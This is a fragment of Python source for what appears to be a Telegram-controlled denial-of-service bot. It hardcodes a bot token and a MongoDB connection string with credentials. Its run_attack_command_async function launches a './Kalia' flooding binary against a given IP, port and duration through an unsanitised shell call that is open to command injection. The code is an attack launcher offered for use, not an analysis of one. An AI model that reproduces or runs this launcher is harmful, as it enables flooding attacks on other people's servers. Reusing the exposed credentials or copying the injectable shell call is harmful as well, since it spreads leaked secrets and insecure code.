...
TOKEN = '7036687622:AAFncYh2wb68w7WwshG5ThMXULJcfdhs1Ns'
ADMIN_USER_ID = 5163805719
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=@KIING_OP'
USERNAME = "@KIING_OP"  # Immutable username for maximum security
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process = await asyncio.create_subprocess_shell(f"./Kalia {target_ip} {target_port} {duration} 1000")
